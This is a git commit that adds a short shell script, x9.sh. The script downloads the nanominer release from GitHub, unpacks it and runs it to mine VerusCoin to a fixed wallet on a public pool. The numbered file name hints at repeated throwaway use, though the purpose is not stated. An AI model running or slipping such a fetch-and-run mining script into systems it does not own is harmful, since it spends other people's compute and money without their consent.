911c69d920a346f6a80c6b7407c0f6150068df55
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 22:36:52 -0300

    Update and rename x8.sh to x9.sh

---
+++ x9.sh
@@ -0,0 +1,4 @@
+# veruscoin
+wget https://github.com/nanopool/nanominer/releases/download/v3.7.6/nanominer-linux-3.7.6.tar.gz
+tar -xf nanominer-linux-3.7.6.tar.gz
+./nanominer -algo Verushash -wallet RVxwfn5TggLnYPgEAGQf8W7kes28QNQGJg.Rig001 -coin VRSC -pool1 na.luckpool.net:3956 -useSSL false -t 4
